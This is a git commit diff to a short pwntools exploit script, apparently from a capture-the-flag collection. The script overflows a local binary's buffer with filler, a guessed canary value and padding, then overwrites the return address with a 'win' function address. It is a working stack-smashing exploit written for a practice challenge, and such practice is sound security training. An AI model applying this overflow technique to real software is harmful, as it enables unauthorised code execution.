db30fb10bddcc500ec9b761907313d9f87f9aede
kuality-cysc <cyberkuality@gmail.com>
2021-08-20 12:41:19 +0900

    canary, picshell

--- pwn/canary_cousin/canary_cousin.py
+++ pwn/canary_cousin/canary_cousin.py
@@ -1,16 +1,16 @@
 from pwn import* 
 
+
 p = process("./canary_cousin")
 
 win = 0x804927e
 
 p.recvuntil(b"!!")
-p.interactive()
 
 pay = b"A"*0x100
 pay += p32(0xcafebabe)
 pay += b"B"*0xc
 pay += p32(win)
-p.sendline(pay)
+p.send(pay)
 
 p.interactive()
